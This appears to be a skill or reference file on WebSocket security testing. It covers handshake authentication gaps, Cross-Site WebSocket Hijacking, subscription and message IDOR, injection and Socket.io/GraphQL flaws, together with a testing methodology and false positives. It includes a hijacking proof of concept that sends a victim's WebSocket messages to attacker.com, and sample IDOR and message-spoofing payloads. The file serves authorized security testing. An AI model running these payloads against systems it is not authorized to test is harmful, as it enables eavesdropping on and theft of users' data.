---
name: websocket
description: WebSocket security testing covering handshake auth gaps, origin validation, subscription IDOR, and message-level authorization failures
---

# WebSocket

WebSocket endpoints often have weaker authentication and authorization than their HTTP equivalents. Handshake checks may pass once, then per-message enforcement is missing — enabling subscription hijacking, cross-user data leaks, and CSWSH (Cross-Site WebSocket Hijacking).

## Attack Surface

**Protocols & Libraries**
- Raw WebSocket (RFC 6455)
- Socket.io (HTTP long-polling fallback, namespaces, rooms)
- `ws` (Node), Django Channels, FastAPI/Starlette, NestJS `@WebSocketGateway`
- GraphQL subscriptions (`graphql-ws`, `graphql-transport-ws`)

**Handshake**
- Upgrade request: `GET` with `Connection: Upgrade`, `Upgrade: websocket`
- `Sec-WebSocket-Key` / `Sec-WebSocket-Version`
- `Origin`, `Cookie`, `Authorization` headers at connect time
- Subprotocol negotiation: `Sec-WebSocket-Protocol`

**Message Patterns**
- JSON RPC-style: `{action, type, event, channel, room, topic, payload}`
- Pub/sub: subscribe/unsubscribe to channels by ID or name
- Heartbeat/ping-pong, binary frames, fragmented messages

## Reconnaissance

**Endpoint Discovery**
```
/ws /websocket /socket /socket.io /sockjs
/ws/chat /ws/notifications /realtime /live
/engine.io (Socket.io transport)
```

**Browser DevTools**
- Network tab → filter WS → inspect frames, sent headers at handshake
- Note cookies and `Authorization` sent (or absent) on upgrade

**Socket.io Fingerprint**
```
GET /socket.io/?EIO=4&transport=polling
```
Response reveals version, namespaces, session IDs.

**Message Enumeration**

Capture legitimate client traffic; map event names (`join`, `subscribe`, `message`, `admin`, `broadcast`). Fuzz `type`/`action` fields with admin/debug event names from JS bundles.

## Key Vulnerabilities

### Authentication Gaps

**Missing Handshake Auth**
- Server accepts connections without `Authorization` or session cookie
- Token in query string only (`wss://host/ws?token=`) — leaks via Referer/logs
- Auth checked on HTTP site but not on parallel WS endpoint

**One-Time Auth Only**
- Token validated at connect; no per-message re-validation after logout/revocation
- Role change on HTTP side not reflected in open WS session

### Origin Validation (CSWSH)

Cross-Site WebSocket Hijacking: victim browser opens WS to target with victim's cookies because server doesn't validate `Origin`.

**SameSite caveat:** With `SameSite=Lax` or `Strict` session cookies, modern browsers usually withhold cookies on cross-site WebSocket handshakes — CSWSH PoCs may fail even when Origin validation is missing. Re-test with `SameSite=None` sessions and legacy clients. SameSite does not replace Origin checks for same-site subdomain attacks or token-in-query auth.

**Test:**
```html
<script>
  ws = new WebSocket("wss://target.com/ws");
  ws.onmessage = m => fetch("https://attacker.com/?"+btoa(m.data));
</script>
```

- Missing or wildcard `Origin` check on handshake
- `Origin: null` accepted (sandboxed iframe contexts)
- Check `Host` header poisoning on WS upgrade

### Authorization / IDOR

**Channel/Room Subscription**
```json
{"action":"subscribe","channel":"user.123.notifications"}
{"event":"join","room":"admin-dashboard"}
{"type":"listen","topic":"org/456/billing"}
```

Swap IDs to access other users' channels. Test horizontal (peer user) and vertical (admin) topics.

**Message-Level IDOR**
```json
{"action":"send","to":"victim_user_id","body":"phishing"}
{"action":"read","conversationId":"foreign_uuid"}
```

Server routes messages by client-supplied destination without server-side ownership check.

### Injection & Logic Flaws

**Server-Side**
- JSON fields passed to SQL/NoSQL/template engines without sanitization
- Command events triggering server actions (`exec`, `eval`, `system`) on user input
- Broadcast to all connected clients without intent (message fan-out abuse)

**Client-Side**
- WS messages inserted into DOM without encoding → stored/reflected XSS via chat
- `innerHTML` updates from `onmessage` handlers

### Socket.io Specific

- Namespace `/admin` reachable without auth while default `/` is public
- Room join without membership check: `socket.join(attacker_controlled_room)` then listen
- Admin flag in handshake cookie not re-checked on `socket.on('admin_action')`
- Polling transport CSRF: POST to `/socket.io/` with session cookie

### GraphQL Subscriptions

- Subscription resolver lacks same auth as query resolver
- `subscription { userData(userId: "OTHER") }` IDOR via variables
- Introspection over WS revealing subscription schema

### Denial of Service

- No message size/rate limits → large frame floods
- Ping/pong abuse, slow read attacks
- Unlimited subscriptions per connection

## Advanced Techniques

**Handshake Smuggling Context**
- WS upgrade through CDN/proxy with different auth than direct origin
- ALB/Cloudflare WebSocket settings exposing internal paths

**Token Replay**
- Capture WS `Authorization` header from one client; replay from another IP
- Subprotocol token passed in `Sec-WebSocket-Protocol` — often logged

**Parallel Transport Testing**
- Same operation via HTTP API vs WS — compare auth requirements
- REST blocked but WS `delete_user` event succeeds

## Testing Methodology

1. **Capture baseline** — Connect as legitimate user; record handshake headers and message schema
2. **Unauthenticated connect** — Omit cookies/tokens; attempt subscribe/send
3. **Origin fuzz** — `Origin: https://evil.com`, `null`, missing
4. **IDOR matrix** — Swap user/org/channel IDs in subscribe and message events
5. **Privilege escalation** — User token on admin channels/events
6. **Cross-transport** — Compare HTTP vs WS auth for equivalent operations
7. **Post-logout** — Revoke session on HTTP; verify WS still accepts messages

## Validation

1. Demonstrate cross-user data read or write via WS (subscription IDOR or message routing)
2. CSWSH PoC: cross-origin page receives victim WS data using victim cookies
3. Show unauthenticated or post-logout access to protected channel/action
4. Document event name, payload, and missing server-side check
5. Confirm HTTP equivalent correctly blocks the same unauthorized action

## False Positives

- Origin checked against explicit allowlist on every handshake
- Per-message auth re-validates session/token and object ownership
- Channel names are server-assigned opaque tokens, not guessable user IDs
- WS requires non-cookie token not sent automatically by browser (mitigates CSWSH)
- Connection rejected after HTTP logout via server-side session invalidation broadcast

## Impact

- Real-time eavesdropping on notifications, chat, trading, admin dashboards
- Cross-user message injection and impersonation
- CSWSH session riding for live account manipulation
- Privilege escalation to admin channels without HTTP-side authorization

## Pro Tips

1. Always test WS with and without cookies — many apps only protect HTTP
2. Map event names from minified JS; look for `emit("`, `.on("`, `subscribe(`
3. Socket.io: test each namespace independently — auth is per-namespace
4. After IDOR on subscribe, wait for server-pushed events (not just request/response)
5. Pair with `idor`, `csrf`, and framework skills (nestjs, fastapi, django channels)

## Summary

WebSocket security requires handshake auth, strict Origin validation, and per-message authorization — not just connect-time checks. Treat every subscribe/send event like an HTTP endpoint with its own authz test.
